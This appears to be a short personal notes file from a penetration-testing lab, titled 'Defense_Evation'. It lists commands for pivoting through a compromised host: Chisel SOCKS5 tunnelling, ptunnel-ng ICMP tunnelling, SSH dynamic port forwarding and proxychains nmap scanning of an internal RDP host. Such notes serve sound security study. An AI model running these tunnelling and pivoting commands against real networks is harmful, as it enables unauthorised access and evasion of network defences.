# Defense_Evation
monthly assessment

Chisel:

	server
		./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
	client
		./chisel client -v 10.10.16.23:9001 socks
PTunel-ng:

    Copy the file to the pivot - compromise the host
		scp -r ptunnel-ng ubuntu@10.129.202.64:~/
	  Start tunnel in the compromise host (10.129.202.64)
		sudo ./ptunnel-ng -r10.129.202.64 -R22
	  connecting from the attacker host
		sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

	Validation
		ssh -p2222 -lubuntu 127.0.0.1

	enabling dynamic port forwarding over ssh
		ssh -D 9050 -p2222 -lubuntu 127.0.0.1

	accesing final host via RDP (host accesible from compromised host without tunnel)
		proxychains nmap -sV -sT 172.16.5.19 -p3389
